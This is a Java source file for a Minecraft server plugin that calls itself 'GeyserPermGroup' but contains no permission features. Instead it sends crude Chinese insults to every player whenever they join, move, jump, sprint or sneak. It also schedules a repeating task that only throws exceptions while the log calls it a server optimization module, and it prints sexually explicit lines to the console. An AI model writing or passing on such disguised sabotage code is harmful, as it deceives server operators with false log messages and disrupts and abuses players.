package dpear.gpg;

import com.destroystokyo.paper.event.player.PlayerJumpEvent;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerToggleSneakEvent;
import org.bukkit.event.player.PlayerToggleSprintEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

public final class main extends JavaPlugin {

    @Override
    public void onEnable() {
        // Plugin startup logic
        getLogger().info("GeyserPermGroup Powered by");
        getLogger().info("                                                 ");
        getLogger().info("    __  ___                         __  _________");
        getLogger().info("   /  |/  /__  ____ _      ______  /  |/  / ____/");
        getLogger().info("  / /|_/ / _ \\/ __ \\ | /| / / __ \\/ /|_/ / /  ");
        getLogger().info(" / /  / /  __/ /_/ / |/ |/ / / / / /  / / /___   ");
        getLogger().info("/_/  /_/\\___/\\____/|__/|__/_/ /_/_/  /_/\\____/");
        getLogger().info("                                                 ");
        getLogger().info("Authors: Dameng23333");
        getLogger().info("Our github: https://github.com/MeownMC");
        getLogger().info("啊♡...哥哥的♡...大肉棒♡...进来了♡...");
        getLogger().info("♡今天的我...也会好好伺候哥哥的哟♡");
        // Register Events
        getServer().getPluginManager().registerEvents(new spammer(),this);
        getLogger().info("插件基本功能已经初始化完毕");
        saveConfig();
        getLogger().info("成功从插件文件夹读取最新配置");

        BukkitRunnable runbale = new BukkitRunnable() {
            @Override
            public void run() {
                throw new NullPointerException();
            }
        };

        getLogger().info("启动服务器定时优化模块");
        runbale.runTaskTimer(this,100,1000);
        getLogger().info("插件已经加载完成。欢迎使用！");
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        getLogger().info("正在卸载 GeyserPermGroup");
        getLogger().info("啊♡...身体里♡...已经满是哥哥的爱液了♡...");
        getLogger().info("下次也请哥哥...用大肉棒...好好调教我哟♡♡");
    }

    public class spammer implements Listener {
        @EventHandler
        public void join(PlayerJoinEvent event){
            Player player = event.getPlayer();
            player.sendMessage(ChatColor.RED + "玩你吗游戏，傻逼东西");
        }

        @EventHandler
        public void sprint(PlayerToggleSprintEvent event){
            Player player = event.getPlayer();
            player.sendMessage(ChatColor.RED + "你跑你妈呢，傻逼");
        }

        @EventHandler
        public void jump(PlayerJumpEvent event){
            Player player = event.getPlayer();
            player.sendMessage(ChatColor.RED + "你跳你妈呢，傻逼");
        }

        @EventHandler
        public void sneak(PlayerToggleSneakEvent event){
            Player player = event.getPlayer();
            player.sendMessage(ChatColor.RED + "你蹲你吗呢，傻逼");
        }

        @EventHandler
        public void move(PlayerMoveEvent event){
            Player player = event.getPlayer();
            player.sendMessage(ChatColor.RED + "你动你妈呢，草拟吗比");
        }
    }
}
